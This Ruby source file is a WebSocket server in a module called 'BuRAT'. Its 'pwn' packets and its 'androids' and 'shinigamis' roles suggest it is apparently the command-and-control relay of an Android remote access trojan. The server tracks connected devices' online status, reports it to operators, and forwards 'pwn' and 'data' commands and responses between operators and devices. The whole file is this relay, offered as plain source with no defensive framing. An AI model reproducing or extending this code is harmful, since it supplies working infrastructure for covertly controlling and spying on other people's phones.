require 'faye/websocket'
require 'json'

module BuRAT
  class WebSocketServer
    KEEPALIVE_TIME = 15 # in seconds

    def initialize(app)
      @app     = app
      @androids = []
      @shinigamis = []
    end

    def call(env)
      if Faye::WebSocket.websocket?(env)
        ws = Faye::WebSocket.new(env, nil, {ping: KEEPALIVE_TIME })

        ws.on :open do |event| # open

        end

        ws.on :message do |event| # message
          begin
            packet = JSON.parse(event.data) # parse packet

            header = packet['header']       # header
            payload = packet['payload']     # payload
            trailer = packet['trailer']     # trailer

            p "#{header} #{payload} #{trailer}"        # debug

            if header == "androids" then # clients - list of clients
              @androids.each do |android|
                packet = packet("android", android, 'android')
                ws.send(packet) if @shinigamis.include?(ws)
              end
            elsif header == "android" then # client - client identification
              android = @androids.find { |android| android["id"] == payload["id"] }
              payload.store("status", "Online")
              payload.store("ws", ws)
              payload["inators"].each { |inator| inator.store("pipes", Array.new) }
              android == nil ? @androids << payload : android.replace(payload)
              packet = packet("android", payload, "#{payload["name"]} online")
              @shinigamis.each { |shinigami| shinigami.send(packet) }
            elsif header == "pwn" || header == "data" then # pwn and data - relay to androids
              payload_in = payload
              payload_out = payload.dup
              android_in = @androids.find { |android| android["ws"] == ws }
              android_out = @androids.find { |android| android["id"] == payload_in["android"] }
              payload_out["android"] = android_in["id"]
              packet = packet(header, payload_out, trailer)
              android_out["ws"].send(packet)
            elsif header == "shinigami" then # shinigami - shinigami identification
              @shinigamis << ws
            end
          rescue
            #ws.send(event.data)
            #some server stuff here if error is packet is not json
          end
        end

        ws.on :close do |event| # close
          android = @androids.find { |android| android["ws"] == ws }
          android["status"] = "Offline"
          android["ws"] = nil
          packet = packet('android', android, "#{android["name"]} offline")
          @shinigamis.each { |shinigami| shinigami.send(packet) }
        end

        ws.on :error do |event| # error
          android = @androids.find { |android| android["ws"] == ws }
          android["status"] = "Error"
          android["ws"] = nil
          packet = packet('android', android, "#{android["name"]} error : #{event.code} #{event.reason}")
          @shinigamis.each { |shinigami| shinigami.send(packet) }
        end

        # Return async Rack response
        ws.rack_response

      else
        @app.call(env)
      end
    end

    private
    def packet(header, payload, trailer) # packet
      {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
    end

  end
end
